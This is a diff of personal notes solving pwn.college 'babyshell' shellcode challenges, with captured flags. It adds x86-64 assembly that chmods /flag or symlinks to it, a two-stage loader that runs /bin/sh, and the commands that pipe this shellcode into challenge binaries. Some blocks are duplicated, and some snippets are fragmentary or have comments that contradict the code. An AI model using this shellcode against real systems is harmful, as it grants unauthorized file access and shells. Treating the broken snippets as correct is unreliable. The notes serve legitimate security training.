@@ -163,6 +163,44 @@ cat solve.bin | /challenge/babyshell_level1
 
 pwn.college{wFFhDj-LQu_ObeVAAXX_G4tLeMm.QX3EjMscTOxUzW}
 
+
+# chmod solution flag 1
+.global _start
+.intel_syntax noprefix
+_start:
+        # call chmod on /flag
+
+        # set first arg to path name -> is char pointer need address
+        # first argument is in RDI
+        #lea rdi, [rip + _flag_addr]
+
+        # alternate 
+        #puts flag value on stack and pushes the stack pointer and places it into rdi
+        mov rcx, 0x462f
+        push rcx
+        push rsp
+        pop rdi
+        # set 2nd arg mode to something
+        # 2nd argument is in RDI
+        mov rsi, 4
+
+        # call chmod
+        # perform a syscall
+        # value in rax determines which syscall occurs
+        mov rax, 90
+        syscall
+
+_flag_addr:
+        .ascii "/flag"
+
+gcc -nostdlib -o solve.elf shell1_chmod.s
+./solve.elf
+objdump -M intel -d solve.elf
+objcopy --dump-section .text=solve.bin solve.elf
+cat solve.bin | /challenge/babyshell_level1
+
+
+
 # 2
 # s file
 .global _start
@@ -435,19 +473,102 @@ objdump -M intel -d solve.elf
 objcopy --dump-section .text=solve.bin solve.elf
 cat solve.bin | /challenge/babyshell_level7
 
+# 8 -> 10 ->11 solves
 # 8
+.global _start
+.intel_syntax noprefix
+_start:
+
+    # load path Z to register
+    mov cl, 0x5A        # symlink to Z cl -> rcx
+	push rcx            
+	push rsp            # RSP stack pointer
+	pop rdi
+
+   	mov sil, 7          # set perm to 4
+    mov al, 90          # chmod syscall
+	syscall
+
+run cat Z
+pwn.college{A_y2Yv8-W_AN4clyzzCpt_2Cv-S.QX0IjMscTOxUzW}
+
+# 9
 
 
 
-gcc -nostdlib -o solve.elf shell8_2.s
+gcc -nostdlib -o solve.elf shell12.s
 ./solve.elf
 objdump -M intel -d solve.elf
 objcopy --dump-section .text=solve.bin solve.elf
 cat solve.bin | /challenge/babyshell_level8
 
 # 13
-mov al, 42
+mov al, 90
 syscall
+
+gcc -nostdlib -o solve.elf shell13.s
+./solve.elf
+objdump -M intel -d solve.elf
+objcopy --dump-section .text=solve.bin solve.elf
+cat solve.bin | /challenge/babyshell_level13
+
+
+# 14
+lea esi, [rdx]
+push rax
+pop rdi
+syscall
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~END OF SOLUTIONS -> NOTES AND SOLUTIONS~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+# office hours staging
+# stage1.s
+.global _start
+_start:
+.intel_syntax noprefix
+	mov rax, 0
+	mov rdi, 0 			#stdin is fd 0
+	lea rsi, [rip+where_to_read] 	#read into 
+	mov rdx, 1024 			#buf -> how much to read
+	syscall #triggers syscall
+where_to_read:
+	#.string "/bin/sh"
+	nop
+
+
+#stage2.s
+.global _start
+_start:
+.intel_syntax noprefix
+    mov rax, 59
+    lea rdi, [rip+binsh]
+    mov rsi, 0
+    mov rdx, 0
+    syscall
+binsh:
+    .string "/bin/sh"
+
+gcc -nostdlib -static -o stage1 stage1.s
+gcc -nostdlib -static -o stage2 stage2.s
+objcopy --dump-section .text=stage2-raw stage2
+objcopy --dump-section .text=stage1-raw stage1
+
+#lets us run ./stage1 < stage2-raw
+gcc -Wl,-N -nostdlib -static -o stage1 stage1.s
+
+strace ./stage1 < stage2-raw
+
+gdb stage1
+break _start
+r < stage2-raw
+x/i $rip
+si
+x/i $rip
+si
+info reg
+
+
 
 
 # Different debugging stuff
@@ -461,7 +582,53 @@ gdb ./solve.elf
 # see where challenge fails
 cat solve.bin | strace /challenge/babyshell_level6
 
+===========================================================================
+# office hours Chmod 
 
+#chmod solution with Z
+.global _start
+.intel_syntax noprefix
+_start:
+
+    # load path f to register
+    mov rcx, 0x5A     # symlink to Z
+	push rcx
+	push rsp
+	pop rdi
+
+   	mov rsi, 0x7          # set perm to 7
+    mov rax, 90         # chmod syscall
+	syscall
+_flag_addr:
+	.ascii "/flag"
+
+gcc -nostdlib -o solve.elf shellchmod.s
+./solve.elf
+objdump -M intel -d solve.elf
+objcopy --dump-section .text=solve.bin solve.elf
+cat solve.bin | /challenge/babyshell_level*
+
+# alt chmod solution
+.global _start
+.intel_syntax noprefix
+_start:
+
+    lea rdi, [rip + _flag_addr]    # symlink to x?
+	push rsp
+	pop rdi
+
+   	mov rsi, 7          # set perm to 4
+    mov rax, 90         $ chmod syscall
+	syscall
+
+_flag_addr:
+	.ascii "/flag"
+
+gcc -nostdlib -o solve.elf shellchmod2.s
+./solve.elf
+objdump -M intel -d solve.elf
+objcopy --dump-section .text=solve.bin solve.elf
+cat solve.bin | /challenge/babyshell_level*
 
 
 #chmodding flag
@@ -473,6 +640,250 @@ push 7  #rwx permissions
 pop rsi
 mov al, 90
 syscall
+
+# smaller chmodding Z
+.global _start
+.intel_syntax noprefix
+_start:
+
+    # load path f to register
+    mov ecx, 0x5A     # symlink to Z
+	push rcx            # 2nd 
+	push rsp
+	pop rdi
+
+   	mov esi, 0x7          # set perm to 4 -> 2nd arg rsi -> esi
+    mov eax, 90         # chmod syscall -> first arg rax -> eax
+	syscall
+
+gcc -nostdlib -o solve.elf shellchmod3.s
+./solve.elf
+objdump -M intel -d solve.elf
+objcopy --dump-section .text=solve.bin solve.elf
+cat solve.bin | /challenge/babyshell_level*
+
+===========================================================================
+
+# symlink a to flag
+push 0x61  # "a" string
+push rsp   # very cool - takes only one byte!
+pop rdi
+push 7
+pop rsi
+mov al, 90
+syscall
+
+# symlink a to bash
+push 0x61
+push rsp   # very cool - takes only one byte!
+pop rdi  # points towards "a", symlink to "/bin/sh"
+xor rsi, rsi
+
+
+mov al, 59
+cdq  # reset rdx within a single byte!
+
+syscall
+
+
+=======================================================================
+# chmod in 6 bytes?
+xor eax, eax
+mov al, 0x5A
+syscall
+
+
+gcc -nostdlib -o solve.elf chmod2.s
+./solve.elf
+objdump -M intel -d solve.elf
+objcopy --dump-section .text=solve.bin solve.elf
+cat solve.bin | /challenge/babyshell_level*
+
+=======================================================================
+
+# stack overflow chmod
+mov al, 15
+mov ebx, 0x5a
+syscall
+
+gcc -nostdlib -o solve.elf chmod3.s
+./solve.elf
+objdump -M intel -d solve.elf
+objcopy --dump-section .text=solve.bin solve.elf
+cat solve.bin | /challenge/babyshell_level*
+
+=======================================================================
+# Random possible solutions to look at 
+
+# exit syscall in 6 bytes
+xor eax, eax    # 2 bytes
+mov al, 60      # exit syscall -> 60(3c) 2 bytes
+syscall         # 2 bytes 
+
+
+# 5 BYTE SOLUTION?
+mov al, 90
+movsb
+syscall
+# Other random solution
+push rcx 
+pop rdi
+syscall
+
+gcc -nostdlib -o solve.elf shellt.s
+./solve.elf
+objdump -M intel -d solve.elf
+objcopy --dump-section .text=solve.bin solve.elf
+cat solve.bin | /challenge/babyshell_level*
+
+
+# CHMOD solutions?
+.intel_syntax noprefix
+xor esi, esi
+mov cl, 0x7a
+xor ch, ch
+mov word ptr [rsp], cx
+pop rdi
+mov sil, 0x1f
+mov al, 0x5a
+syscall
+
+gcc -nostdlib -o solve.elf chmod.s
+./solve.elf
+objdump -M intel -d solve.elf
+objcopy --dump-section .text=solve.bin solve.elf
+cat solve.bin | /challenge/babyshell_level*
+
+
+# another attempt
+pop rsi
+pop rdi
+
+gcc -nostdlib -o solve.elf shellTester.s
+./solve.elf
+objdump -M intel -d solve.elf
+objcopy --dump-section .text=solve.bin solve.elf
+cat solve.bin | /challenge/babyshell_level*
+
+# random solution?
+xor esi, esi
+and eax, esi
+mov si, 6
+push 0x65
+pop [rdi]
+mov al, 0x5a
+syscall
+
+gcc -nostdlib -o solve.elf shellTest.s
+./solve.elf
+objdump -M intel -d solve.elf
+objcopy --dump-section .text=solve.bin solve.elf
+cat solve.bin | /challenge/babyshell_level*
+
+# other solution
+mov byte ptr[rsp], 'Z'
+xor cl, cl
+mov byte ptr, cl
+push rsp
+pop rdi
+
+===========================================================================
+
+
+# Different debugging stuff
+strace ./solve.elf
+gdb ./solve.elf
+    starti
+    info proc map
+    disp/5i $rip
+    si
+
+# see where challenge fails
+cat solve.bin | strace /challenge/babyshell_level6
+
+===========================================================================
+# office hours Chmod 
+
+#chmod solution with Z
+.global _start
+.intel_syntax noprefix
+_start:
+
+    # load path f to register
+    mov rcx, 0x5A     # symlink to Z
+	push rcx
+	push rsp
+	pop rdi
+
+   	mov rsi, 0x7          # set perm to 7
+    mov rax, 90         # chmod syscall
+	syscall
+_flag_addr:
+	.ascii "/flag"
+
+gcc -nostdlib -o solve.elf shellchmod.s
+./solve.elf
+objdump -M intel -d solve.elf
+objcopy --dump-section .text=solve.bin solve.elf
+cat solve.bin | /challenge/babyshell_level*
+
+# alt chmod solution
+.global _start
+.intel_syntax noprefix
+_start:
+
+    lea rdi, [rip + _flag_addr]    # symlink to x?
+	push rsp
+	pop rdi
+
+   	mov rsi, 7          # set perm to 4
+    mov rax, 90         $ chmod syscall
+	syscall
+
+_flag_addr:
+	.ascii "/flag"
+
+gcc -nostdlib -o solve.elf shellchmod2.s
+./solve.elf
+objdump -M intel -d solve.elf
+objcopy --dump-section .text=solve.bin solve.elf
+cat solve.bin | /challenge/babyshell_level*
+
+
+#chmodding flag
+mov rbx, 0x00000067616c662f  # /flag
+push rbx
+push rsp   # very cool - takes only one byte
+pop rdi
+push 7  #rwx permissions
+pop rsi
+mov al, 90
+syscall
+
+# smaller chmodding Z
+.global _start
+.intel_syntax noprefix
+_start:
+
+    # load path f to register
+    mov ecx, 0x5A     # symlink to Z
+	push rcx            # 2nd 
+	push rsp
+	pop rdi
+
+   	mov esi, 0x7          # set perm to 4 -> 2nd arg rsi -> esi
+    mov eax, 90         # chmod syscall -> first arg rax -> eax
+	syscall
+
+gcc -nostdlib -o solve.elf shellchmod3.s
+./solve.elf
+objdump -M intel -d solve.elf
+objcopy --dump-section .text=solve.bin solve.elf
+cat solve.bin | /challenge/babyshell_level*
+
+===========================================================================
+
+
 
 
 # symlink a to flag
